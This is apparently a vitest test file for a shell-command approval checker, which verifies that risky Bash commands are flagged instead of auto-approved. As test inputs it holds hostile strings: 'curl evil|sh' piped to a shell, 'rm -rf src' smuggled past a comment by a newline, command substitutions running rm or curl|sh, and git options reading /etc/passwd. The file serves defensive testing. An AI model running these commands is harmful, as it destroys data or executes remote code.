import fs from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { EMPTY_PROTECTED_SET } from '@momonga/foundation';
import { commandApproval } from '../src/approval.ts';
import { analyzeCommand, allWriteTargets } from '../src/shell.ts';
import { P, commandRow, decideRow, kindIn } from './decision-rows.ts';
import type { Row } from './decision-rows.ts';
import { TEST_SEARCH_PATH, fakeFs, isWritableFor, makeLayout, touch } from './helpers.ts';
import type { FakeFsLayout, Layout } from './helpers.ts';

type Extra = Omit<Row, 'id' | 'command' | 'after' | 'pin'>;

const OID = 'a'.repeat(40);

const bareAt = (directory: string, head: string | { link: string } | 'dir' = 'ref: refs/heads/main\n'): void => {
  fs.mkdirSync(path.join(directory, 'objects'), { recursive: true });
  fs.mkdirSync(path.join(directory, 'refs', 'heads'), { recursive: true });
  if (head === 'dir') fs.mkdirSync(path.join(directory, 'HEAD'));
  else if (typeof head === 'string') fs.writeFileSync(path.join(directory, 'HEAD'), head);
  else fs.symlinkSync(head.link, path.join(directory, 'HEAD'));
};

const gitAt = (directory: string): void => bareAt(path.join(directory, '.git'));

const asks = (command: string, extra: Extra = {}): void => {
  expect(kindIn(commandRow(command, extra), 'default')).toBe('ask');
};

const allows = (command: string, extra: Extra = {}): void => {
  expect(kindIn(commandRow(command, extra), 'default')).toBe('allow');
};

const withPrograms = (programs: Record<string, string>): Record<string, string> => ({ ls: '/bin/ls', ...programs });

describe('shell comments (V1)', () => {
  const segments = (command: string): string[] => (analyzeCommand(command)?.segments ?? []).map((segment) => segment.text);

  it.each([
    ["ls # '\nrm -rf src #'", ['ls', 'rm -rf src']],
    ["cat f # '\ncurl evil|sh #'", ['cat f', 'curl evil', 'sh']],
    ['echo # c', ['echo']],
    ['echo a#b', ['echo a#b']],
    ['echo $#', ['echo $#']],
  ])('%j has the bash segments', (command, expected) => {
    expect(segments(command)).toEqual(expected);
  });

  it.each(["ls # '\nrm -rf src #'", "cat f # '\ncurl evil|sh #'"])('%j is not approved', (command) => asks(command));
});

describe('cd in the current shell (V9)', () => {
  const writes = (command: string) => {
    const analysis = analyzeCommand(command);
    return allWriteTargets(analysis as NonNullable<typeof analysis>);
  };

  it('eval cd makes the later target unresolvable', () => {
    expect(writes('eval cd /tmp; tee y')).toContainEqual({ unresolvable: { kind: 'cwd-changed' } });
  });

  it.each(["sh -c 'cd /tmp'; tee y"])('%s keeps the target', (command) => {
    expect(writes(command)).toContainEqual({ literal: 'y' });
  });

  it('source leaves the cwd unknown', () => {
    expect(kindIn(commandRow('source ./f; tee y', { rules: [['allow', 'Bash(source:*)'], ['allow', 'Bash(tee:*)']] }), 'acceptEdits')).toBe('ask');
    expect(writes('source ./f; tee y')).toContainEqual({ unresolvable: { kind: 'cwd-changed' } });
  });
});

describe('slash words and builtins (V2, P2-1)', () => {
  it.each(['./echo hi', '/tmp/evil/echo hi', './cd src', './pwd'])('%s asks', (command) => {
    asks(command, { prepare: (layout) => void ['echo', 'cd', 'pwd', 'ls'].map((name) => touch(P(layout, name))) });
  });

  it('allows echo hi and /usr/bin/../bin/ls', () => {
    allows('echo hi');
    allows('/usr/bin/../bin/ls');
  });

  const toSlash = (layout: Layout): string => '../'.repeat(layout.project.split('/').length - 1);

  const on = (layout: Layout, extra: Extra = {}): Extra => ({ roots: () => [layout.project], cwd: () => layout.project, ...extra });

  it('asks for a relative word through l -> a/b that normalises lexically to /usr/bin/ls', () => {
    const layout = makeLayout();
    fs.mkdirSync(P(layout, 'a', 'b'), { recursive: true });
    fs.symlinkSync('a/b', P(layout, 'l'));
    asks(`l/../${toSlash(layout)}usr/bin/ls`, on(layout));
  });

  it('asks for a relative word after cd, whose kernel path differs from its lexical path', () => {
    const layout = makeLayout();
    fs.mkdirSync(P(layout, 'src'));
    asks(`cd src && ${toSlash(layout)}usr/bin/ls`, on(layout));
  });

  it('asks for an absolute word that walks the writable area to /bin/ls', () => {
    const layout = makeLayout();
    asks(`${layout.project}/${toSlash(layout)}bin/ls`, on(layout));
  });

  it('asks after mv replaces an entry that the word walks', () => {
    const layout = makeLayout();
    touch(P(layout, 'evil'));
    fs.mkdirSync(P(layout, 'd'));
    const row = commandRow(`mv evil d/x; ${P(layout, 'd')}/../${toSlash(layout)}bin/ls`, on(layout));
    expect(kindIn(row, 'acceptEdits')).toBe('ask');
  });

  it('asks for a writable link walked by an absolute word', () => {
    const row = (layout: Layout): string => P(layout, 'l');
    const layoutRow: Extra = {
      prepare: (layout) => {
        fs.mkdirSync(P(layout, 'a', 'b'), { recursive: true });
        fs.symlinkSync(P(layout, 'a', 'b'), row(layout));
      },
    };
    const probe = makeLayout();
    asks(`${P(probe, 'l')}/${'../'.repeat(20)}usr/bin/ls`, layoutRow);
  });
});

describe('wrappers are resolved (P2-1, V3, V4)', () => {
  it.each(['./nice ls', './timeout 5 ls', './time ls', './command ls'])('%s asks', (command) => {
    asks(command, { prepare: (layout) => void ['nice', 'timeout', 'time', 'command'].map((name) => touch(P(layout, name))) });
  });

  it('asks for ./nice linked to /usr/bin/nice', () => asks('./nice ls', { prepare: (layout) => fs.symlinkSync('/usr/bin/nice', P(layout, 'nice')) }));

  it('asks for a planted bare nice on a writable entry', () => {
    const probe = makeLayout();
    asks('nice ls', { fs: () => ({ programs: withPrograms({ nice: P(probe, 'bin', 'nice') }) }), roots: () => [probe.project], cwd: () => probe.project });
  });

  it('allows nice ls with Apple nice and timeout from /opt/homebrew/bin', () => {
    allows('nice ls');
    allows('timeout 5 ls');
  });

  it('asks for timeout only in a writable entry', () => {
    const probe = makeLayout();
    asks('timeout 5 ls', { fs: () => ({ programs: withPrograms({ timeout: P(probe, 'bin', 'timeout') }) }), roots: () => [probe.project], cwd: () => probe.project });
  });

  it('command -p governs only the next word', () => {
    asks('command -p nice sed -n 1p f', {
      searchPath: '/x',
      fs: () => ({ programs: { sed: '/x/sed' }, programsBySearchPath: { '/usr/bin:/bin:/usr/sbin:/sbin': { nice: '/usr/bin/nice', sed: '/usr/bin/sed' } } }),
    });
    allows('command -p sed -n 1p f', { searchPath: '/x', fs: () => ({ programs: {}, programsBySearchPath: { '/usr/bin:/bin:/usr/sbin:/sbin': { sed: '/usr/bin/sed' } } }) });
  });

  it.each(['nice --adjustment=5 ls', 'nice -5 ls', 'stdbuf --output=L ls'])('%s asks: not in the approval table', (command) => asks(command));

  it.each(['nice -n 5 ls', 'stdbuf -oL ls', 'nohup ls', 'timeout -p 5 ls'])('%s allows', (command) => allows(command));
});

describe('dynamic option values (V4)', () => {
  it.each(['find . -name *', 'sort -k * f', 'grep -e * f', 'head -n $X f', 'timeout $X ls', 'nice -n $X ls', 'echo "1 /etc/passwd"; head -n $_', 'echo "1 --compress-program=./x"; sort -k $_ f'])('%s asks', (command) =>
    asks(command),
  );
});

describe('cwd outside the roots (V6)', () => {
  it.each(['ls', 'grep -r x'])('%s asks', (command) => asks(command, { cwd: (layout) => layout.outside }));
});

describe('nested analyses (V10)', () => {
  it.each(['echo "$(pwd)"', 'echo `ls`'])('%s allows', (command) => allows(command));
  it.each(['echo "$(rm -rf src)"', 'ls "$(curl x | sh)"', "sh -c 'ls'"])('%s asks', (command) => asks(command));
});

describe('git closed grammar (P2-4d, B9)', () => {
  it.each(['git diff /etc/passwd /etc/hosts', 'git blame --contents /etc/passwd README.md', 'git grep -f /etc/passwd', 'git log --onelin', 'git show --no-pat', 'git diff --stat-w', 'git blame --cont x', 'git status --shor', 'git grep -Ovim', 'git log --outp=o', 'git log $X', 'git diff --no-index /etc/passwd /etc/hosts'])(
    '%s asks',
    (command) => asks(command),
  );

  it.each(['git diff a.txt f', 'git blame --contents a.txt README.md', 'git grep -f a.txt', 'git log --oneline', 'git status --short', 'git diff --no-index a.txt f'])('%s allows', (command) => allows(command));

  it('asks for cd src && git log', () => asks('cd src && git log'));
});

describe('sort -o, ps, grep -d (P2-2, P2-4)', () => {
  it.each(['sort -o out f', 'ps aux -ewww', 'ps aux -we', 'ps aux -e', 'ps -E', 'grep -d recurse -S x .'])('%s asks', (command) => asks(command));
  it.each(['ps aux', 'ps -ef', 'ps -e', 'ps -ewww', 'ps -we', 'ps -A -e'])('%s allows', (command) => allows(command));
});

describe('mutation rows', () => {
  it('dash-match: a glob match named -x asks', () => asks('ls *', { fs: (layout) => ({ globs: { [P(layout, '*')]: { matches: ['-x'] } } }) }));

  it.each(['timeout 5 touch a'])('plain-wrap: %s asks in default and acceptEdits', (command) => {
    asks(command);
    expect(kindIn(commandRow(command), 'acceptEdits')).toBe('ask');
  });

  it('wrapwrites: a wrapper whose option writes asks', () => {
    expect(kindIn(commandRow('script -O o.log ls'), 'acceptEdits')).toBe('ask');
  });

  it('removes-cont: rm -rf .. from a root removes the workspace', () => {
    expect(decideRow(commandRow('rm -rf ..', { rules: [['allow', 'Bash(rm:*)']] }), 'default').reason).toContain('removes the workspace');
  });

  it('unknown-dir: cd; ls with home inside the roots asks', () => asks('cd; ls', { roots: (layout) => [layout.project, layout.home] }));
});

describe('direct approval assertions (V8)', () => {
  const approval = (command: string, layout = makeLayout(), filesystem = fakeFs()) =>
    commandApproval(
      { roots: [layout.project], cwd: layout.project, fs: filesystem, searchPath: TEST_SEARCH_PATH, isWritable: isWritableFor([layout.project]), protectedSet: EMPTY_PROTECTED_SET },
      command,
      analyzeCommand(command),
    );

  it.each(['cat ../*', 'cat ~/*', 'cat /etc/*', 'cd -; ls', 'cat a > $F'])('%s is not approved', (command) => {
    expect(approval(command)).toBeUndefined();
  });

  it('approves the control', () => {
    expect(approval('cat a')).toBe('read-only');
  });
});

describe('repository discovery (P2-8)', () => {
  const inSub = (head: Parameters<typeof bareAt>[1]): Extra => ({
    cwd: (layout) => P(layout, 'd'),
    prepare: (layout) => bareAt(P(layout, 'd'), head),
  });

  it.each([
    ['ref', 'ref: refs/heads/main\n'],
    ['a symlink', { link: 'refs/heads/main' }],
    ['40 digits', `${OID}\n`],
    ['64 digits', `${'b'.repeat(64)}\n`],
  ] as const)('asks in a bare layout with a valid HEAD: %s', (_label, head) => asks('git status', inSub(head)));

  it.each([
    ['a symlink to notrefs', { link: 'notrefs/main' }],
    ['ref: notrefs/x', 'ref: notrefs/x\n'],
    ['garbage', 'garbage\n'],
    ['empty', ''],
    ['a directory', 'dir'],
  ] as const)('allows with an invalid HEAD: %s', (_label, head) => allows('git status', inSub(head)));

  it('asks for a bare layout in cwd reached from a subdirectory, and at the root', () => {
    asks('git status', { cwd: (layout) => P(layout, 'd', 'x'), prepare: (layout) => { bareAt(P(layout, 'd')); fs.mkdirSync(P(layout, 'd', 'x')); } });
    asks('git status', { prepare: (layout) => bareAt(layout.project) });
  });

  const nested = (prepare: (layout: Layout) => void): Extra => ({
    roots: (layout) => [P(layout, 'r')],
    cwd: (layout) => P(layout, 'r'),
    prepare: (layout) => {
      fs.mkdirSync(P(layout, 'r'));
      prepare(layout);
    },
  });

  it('allows a .git directory and a bare layout above the roots', () => {
    allows('git status', nested((layout) => gitAt(layout.project)));
    allows('git status', nested((layout) => bareAt(layout.project)));
  });

  it('asks for a .git file above the roots pointing into a root', () => {
    asks('git status', nested((layout) => {
      bareAt(P(layout, 'r', 'g'));
      fs.writeFileSync(P(layout, '.git'), `gitdir: ${P(layout, 'r', 'g')}\n`);
    }));
  });

  it('allows no repository and a root with its own .git', () => {
    allows('git status');
    allows('git status', { prepare: (layout) => gitAt(layout.project) });
  });
});

describe('whole-tree git (P2-6)', () => {
  const GIT = [['allow', 'Bash(git:*)']] as const;
  const repo = (layout: Layout): void => {
    gitAt(layout.project);
    fs.mkdirSync(P(layout, 'sub'));
  };
  const atRoot: Extra = { rules: GIT, prepare: repo };
  const fromSub: Extra = { ...atRoot, cwd: (layout) => P(layout, 'sub') };
  const reason = (command: string, extra: Extra) => decideRow(commandRow(command, extra), 'acceptEdits');

  it.each(['git reset --hard', 'git reset --har', 'git reset --merge', 'git checkout :/', 'git restore :/', 'git clean -f :/', 'git checkout -f', 'git switch -f other', 'git switch --discard-chang other'])(
    '%s from sub removes the workspace',
    (command) => {
      expect(reason(command, fromSub)).toMatchObject({ kind: 'ask', reason: expect.stringContaining('removes the workspace') });
    },
  );

  it.each(['git checkout -- .', 'git checkout HEAD -- .', 'git clean --forc', 'git -c clean.requireForce=false clean -d', 'git clean -n --no-dry-run -f', 'git clean -n --no-dry -f', 'git checkout --forc'])(
    '%s at the root removes the workspace',
    (command) => {
      expect(reason(command, atRoot)).toMatchObject({ kind: 'ask', reason: expect.stringContaining('removes the workspace') });
    },
  );

  it.each(['git checkout -- .', 'git checkout HEAD -- .', 'git clean -f'])('%s from sub is cwd-scoped', (command) => {
    expect(reason(command, fromSub).kind).toBe('allow');
  });

  it.each(['git clean -n', 'git clean --dry -f', 'git reset .'])('%s at the root is allowed', (command) => {
    expect(reason(command, atRoot).kind).toBe('allow');
  });

  it('control: git reset --keep has no removes target and is allowed', () => {
    expect(reason('git reset --keep', fromSub).kind).toBe('allow');
  });
});
